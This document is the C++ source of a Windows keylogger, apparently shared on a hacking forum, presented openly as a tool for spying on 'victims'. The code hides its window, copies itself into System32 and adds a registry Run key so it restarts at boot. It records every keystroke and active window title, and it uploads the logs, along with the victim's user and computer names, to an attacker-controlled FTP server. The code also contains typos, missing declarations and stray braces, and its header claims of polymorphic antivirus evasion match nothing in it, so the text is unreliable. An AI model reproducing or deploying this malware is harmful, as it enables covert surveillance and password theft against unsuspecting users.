	

    /* Remote Access Keylogger through FTP (i.e your webserver)
    This program accesses a remote machine through an exe file executed remotely,
    after the time of execution it activates into a polymorphic state which is
    part of the anti virus stealth mode. It allows the exe to move through the users
    System32 and jump to different locations in memory every 15 seconds for 5 hours...
    or for Sleep(1000 * 60 * 30) = 18000 seconds. This allows the program to refresh
    the passwords from the victims HKEY_LOCAL insets. If the sleep time exceeds 5 hours
    then the exe jumps back to its initial location. I also made the exe file extremely
    small by sending it through the internet tunnel forwarded on the your hostname for
    your webserver to add in file size limited access avoidability to the Anti virus */
     
    // Written by: Phyre_Byte
    // Date Written: 08/12/13
    // Title: R7_Remote-Keylogger
    #include <windows.h> // Native windows api
    #include <winuser.h> // grants registry permission on remote machine
    #include <fstream.h> // creates a text file on your webserver
    #include <wininet.h> // socket protocol transmission or connection
    #include <iostream>  // printing errors and passwords to text file
    #include <conio.h>   // string management and character interpulation
    #include <ctime>         // to gain locale control over time transmission
     
    // SQL database standard credentials
    #define HOST    "your site name"
    #define USER    "your sql db username"
    #define PASS    "your sql db password"
     
    // including standard workspace
    using namespace std;
     
    // global function
    char log_line_limit[255]={0}; // max line length on a text file, 0=start length
     
    // function prototypes
    int program_start(char* prog_name); // this function calls the title of program
    int write_To_buffer(char c); // this functions outputs keylogged events to text file
    int write_To_buffer(char* s, bool timed = false); // double buffer function callback
    void remoteLogName(char* str); // remote file used as server on victims machine
    void open_log(void); // open text file for view only and let attacker read it
    void logClosingName(void); // if server is destroyed output function callback
    bool isMoved(void); // determines if the text file has been moved (deprecated)
     
    // open main function (headquarters)
    DWORD WINAPI ftp_upload(LPVOID lpParam){
            char LogR[255]={0}; // restating global function on top of main callback req
            HINTERNET hConnection, ftp_Server;
            while(true){
                    hConnection = InternetOpen(0,INTERNET_OPEN_TYPE_DIRECT,0,NULL,NULL);
                            if (hConnection == NULL){
                                    write_To_buffer("\n .:Connection Terminated:.",true);
                                    Sleep(2000 * 60 * 15);
                                    continue;
                            }
                            ftp_Server = InternetConnect(hConnection,HOST,INTERNET_DEFAULT_FTP_PORT,
                                                                       USER,PASS,INTERNET_SERVICE_FTP,NULL,0);
                            if (ftp_Server == NULL){
                                    write_To_buffer("\n .:Connection Terminated:.",true);
                                    Sleep(2000 * 60 * 15);
                                    continue;
                            }
                            remoteLogName(LogR);
                           
                            if(!FtpPutFile(ftp_Server,log_line_limit,LogR,INTERNET_FLAG_TRANSFER_BINARY,0)){
                                    write_To_buffer("\n .:Error Uploading File:.",true);
                                    InternetCloseHandle(hConnection);
                                    InternetCloseHandle(ftp_Server);
                                    Sleep(2000 * 60 * 15);
                                    continue;
                            }else{
                                    DeleteFile(log_line_limit);
                                    open_log();
                            }
                            InternetCloseHandle(hConnection);
                            InternetCloseHandle(ftp_Server);
                            Sleep(2000 * 60 * 15);
                    }
            }
    int main(int argc, char* argv[]){
            bool shift;
            char fileName[25];
                    HANDLE hThread;
                    if(!GetSystemDirectory(log_line_limit,255)){
                            write_To_buffer("\n .:System32 does exist:.",true);
                            sprintf(log_line_limit,"C:/Windows/System32/svchost.txt");
                    }else
                            strcat(log_line_limit,"/svchost.txt");
                           
                            open_log();
                            program_start(argv[0]);
                           
                            hThread = CreateThread(NULL,NULL,ftp_upload,NULL,0,(DWORD*)0);
                           
                            if(hThread == NULL){
                                    write_To_buffer("\n .:Error Creating Thread:.",true);
                            }
                           
                            while(true){
                                    while(!kbhit());
                                            for(int i=8;i<=256;++i){
                                                    if(GetAsyncKeyState(VK_SHIFT)){
                                                            for(int i=65;i<=90;++i)
                                                                    if(GetAsyncKeyState(i) == -32767){
                                                                            if(i == 48) write_To_buffer(61);
                                                                            else if(i == 51) write_To_buffer(163);
                                                                            else if(i == 55) write_To_buffer(47);
                                                                            else write_To_buffer(i-16);
                                                                    }
                                                            if (GetAsycKeyState(220) == -32767) write_To_buffer("|");
                                                            if (GetAsycKeyState(188) == -32767) write_To_buffer(";");
                                                            if (GetAsycKeyState(190) == -32767) write_To_buffer(":");
                                                            if (GetAsycKeyState(189) == -32767) write_To_buffer("_");
                                                            if (GetAsycKeyState(187) == -32767) write_To_buffer("*");
                                                            if (GetAsycKeyState(219) == -32767) write_To_buffer("?");
                                                            if (GetAsycKeyState(221) == -32767) write_To_buffer("^");
                                                            if (GetAsycKeyState(226) == -32767) write_To_buffer(">");
                                                            if (GetAsycKeyState(VK_SPACE) == -32767) write_To_buffer(" ");
                                                            if (GetAsycKeyState(VK_BACK) == -32767) write_To_buffer("[DEL]");
                                                    }else{
                                                            if(GetAsyncKeyState(i)& 0x7FFF){
                                                                    logClosingName();
                                                                    shift = Shifted();
                                                                   
                                                                    if(i>47 && i<91){
                                                                            if(shift == false) write_To_buffer(tolower(i));
                                                                            else write_To_buffer((char)i);
                                                                    }else{
                                                                            switch(i){
                                                                                    case VK_BACK:
                                                                                            write_To_buffer("[DEL]");
                                                                                            break;
                                                                                    case VK_SPACE:
                                                                                            write_To_buffer(" ");
                                                                                            break;
                                                                                    case VK_RETURN:
                                                                                            write_To_buffer("\n[RET]\n");
                                                                                            break;
                                                                                    case VK_DELETE:
                                                                                            write_To_buffer("[DELETE]");
                                                                                            break;
                                                                                    case VK_UP:
                                                                                            write_To_buffer("\n[UP ARROW]\n");
                                                                                            break;
                                                                                    case VK_DOWN:
                                                                                            write_To_buffer("\n[DOWN ARROW]\n");
                                                                                            break;
                                                                                    case VK_LEFT:
                                                                                            write_To_buffer("\n[LEFT ARROW]\n");
                                                                                            break;
                                                                                    case VK_RIGHT:
                                                                                            write_To_buffer("\n[RIGHT ARROW]\n");
                                                                                            break;
                                                                                    case VK_MULTIPLY:
                                                                                            write_To_buffer("*");
                                                                                            break;
                                                                                    case VK_DIVIDE:
                                                                                            write_To_buffer("/");
                                                                                            break;
                                                                                    case VK_SUBTRACT:
                                                                                            write_To_buffer("-");
                                                                                            break;
                                                                                    case VK_ADD:
                                                                                            write_To_buffer("+");
                                                                                            break;
                                                                                    case VK_NUMLOCK:
                                                                                            write_To_buffer("\n[NUM LOCK]\n");
                                                                                            break;
                                                                                    case VK_CAPITAL:
                                                                                            write_To_buffer("\n[CAPS LOCK]\n");
                                                                                            break;
                                                                                    case VK_SCROLL:
                                                                                            write_To_buffer("\n[SCROLL LOCK]\n");
                                                                                            break;
                                                                                    case VK_SHIFT:
                                                                                            write_To_buffer("\n[HOLD SHIFT]\n");
                                                                                            break;
                                                                                    case VK_LSHIFT:
                                                                                            write_To_buffer("\n[LEFT SHIFT]\n");
                                                                                            break;
                                                                                    case VK_RSHIFT:
                                                                                            write_To_buffer("\n[RIGHT SHIFT]\n");
                                                                                            break;
                                                                                    case VK_INSERT:
                                                                                            write_To_buffer("\n[INSERT]\n");
                                                                                            break;
                                                                                    case VK_PAUSE:
                                                                                            write_To_buffer("\n[PAUSE]\n");
                                                                                            break;
                                                                                    case VK_CONTROL:
                                                                                            write_To_buffer("\n[CTRL]\n");
                                                                                            break;
                                                                                    case VK_MENU:
                                                                                            write_To_buffer("\n[MENU]\n");
                                                                                            break;
                                                                                    case VK_LMENU:
                                                                                            write_To_buffer("\n[LEFT ALT]\n");
                                                                                            break;
                                                                                    case VK_RMENU:
                                                                                            write_To_buffer("\n[RIGHT ALT]\n");
                                                                                            break;
                                                                                    case VK_ESCAPE:
                                                                                            write_To_buffer("\n[ESC]\n");
                                                                                            break;
                                                                                    case VK_SNAPSHOT:
                                                                                            write_To_buffer("\n[PRINT SCREEN]\n");
                                                                                            break;
                                                                                    case VK_TAB:
                                                                                            write_To_buffer("\n[TAB]\n");
                                                                                            break;
                                                                                    case VK_FINAL:
                                                                                            write_To_buffer("\n[END]\n");
                                                                                            break;
                                                                                    case VK_NEXT:
                                                                                            write_To_buffer("\n[PAGE DOWN]\n");
                                                                                            break;
                                                                                    case VK_PRIOR:
                                                                                            write_To_buffer("\n[PAGE UP]\n");
                                                                                            break;
                                                                                    case VK_HELP:
                                                                                            write_To_buffer("\n[HELP]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD0:
                                                                                            write_To_buffer("\n[NUMPAD 0]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD1:
                                                                                            write_To_buffer("\n[NUMPAD 1]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD2:
                                                                                            write_To_buffer("\n[NUMPAD 2]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD3:
                                                                                            write_To_buffer("\n[NUMPAD 3]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD4:
                                                                                            write_To_buffer("\n[NUMPAD 4]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD5:
                                                                                            write_To_buffer("\n[NUMPAD 5]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD6:
                                                                                            write_To_buffer("\n[NUMPAD 6]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD7:
                                                                                            write_To_buffer("\n[NUMPAD 7]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD8:
                                                                                            write_To_buffer("\n[NUMPAD 8]\n");
                                                                                            break;
                                                                                    case VK_NUMPAD9:
                                                                                            write_To_buffer("\n[NUMPAD 9]\n");
                                                                                            break;
                                                                                    default:
                                                                                            GetKeyNameText(MapVirtualKey(i,0)<<16,fileName,25);
                                                                                            if(strlen(fileName)<2) write_To_buffer(fileName);
                                                                                            else{
                                                                                                    write_To_buffer('[')
                                                                                                    write_To_buffer('fileName');
                                                                                                    write_To_buffer(']');
                                                                                            }
                                                                            }
                                                                    }
                                                            }
                                                    }
                                            }
                            }
                            return 0;
                    }
                    void open_log(void)
                    {
                            DWORD bSize = 255;
                            const char title[] = "title of window";
                            char computerName[255],userName[255];
                            write((char *)title);
                           
                            GetComputerName(computerName,&bSize);
                            GetUserName(userName,&bSize);
                           
                            write_To_buffer("\n .:Victims Username:\t\t");
                            write_To_buffer(userName);
                           
                            write_To_buffer("\n .:Victims Computer Name:\t");
                            write_To_buffer(computerName);
                            write_To_buffer("\n");
                           
                            write_To_buffer("\n .:Operation Complete:\t",true);
                    }
                    int program_start(char* prog_name){
                            HKEY hKey;
                            HWND hWnd;
                            char log_path[255];
                           
                            hWnd = FindWindow("ConsoleWindowClass",NULL);
                            ShowWindow(hWnd,SW_HIDE);
                           
                            if(!GetSystemDirectory(log_path,255)){
                                    write_To_buffer("\n .:Error: could not find server in System32",true);
                                    sprintf(log_path,"C:/Windows/System32/%s","Server.exe");
                            }else{
                                    strcat(log_path,"//");
                                    strcat(log_path,"Server.exe");
                            }
                            if(!CopyFile(prog_name,log_path,FALSE)){
                                    write_To_buffer("\n .:Error: could not copy server from System32",true);
                                    return 1;
                            }
                            if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                                            0,KEY_SET_VALUE,&hKey)!=ERROR_SUCCESS){
                                                                    write_To_buffer("\n .:Error: Could not access registry",true);
                                                                    return 1;
                                                            }
                            if(RegSetValueEx(hKey,"Server",0,REG_SZ,(const unsigned char*)log_path,
                                                             strlen(log_path)!=ERROR_SUCCESS)){
                                                                    write_To_buffer("\n .:Error: could not find server hash in registry",true);
                                                                    RegCloseKey(hKey);
                                                                    return 1;
                                                             }
                            RegCloseKey(hKey);
                            return 0;
                    }
                    int write_To_buffer(char c){
                            ofstream logFile(log_path,ios::out | ios::app);
                            if(!logFile.is_open()){
                                    return 1;
                            }
                            logFile << c;
                            logFile.flush();
                            logFile.close();
                            return 0;
                    }
                   
            int write_To_buffer(char *s, bool timed){
                    time_t cTime;
                    ofstream logFile(log_path,ios::out | ios::app);
                    if(!logFile.is_open()){
                            return 1;
                    }
                    logFile << s;
                    if(timed == true){
                            time(&cTime);
                            logFile << ctime(&cTime);
                    }
                    logFile.flush();
                    logFile.close();
                    return 0;
            }
            void logClosingName(void){
                    static HWND hWnd = NULL;
                    char logClosingName[255] = {0};
                    if(hWnd != GetForegroundWindow()){
                            hWnd = GetForegroundWindow();
                            if(GetWindowText(hWnd,logClosingName,255)){
                                    write_To_buffer("\n .:End Of File: ");
                                    write_To_buffer(logClosingName);
                                    write_To_buffer(":.END.:");
                            }
                    }
            }
            void remoteLogName(char *str){
                    DWORD size=55;
                    char cName[55],cTime[55];
                   
                    time_t realTime;
                    struct tm * timeInfo;
                   
                    time(&realTime);
                    timeInfo = localtime(&realTime);
                   
                    GetComputerName(cName,&size);
                    strftime(cTime,55,"%d:%m_%H:%M",timeInfo);
                   
                    sprintf(str,"%s_%s.log",cName,cTime);
            }
            bool Shifted(void){
                    if((GetKeyState(VK_LSHIFT)|GetKeyState(VK_RSHIFT))& 0x8000){
                            if(GetKeyState(VK_CAPITAL))return false;
                            else return true;
                    }else{
                            if(GetKeyState(VK_CAPITAL))return true;
                            else return false;
                    }
            }
            }
    }

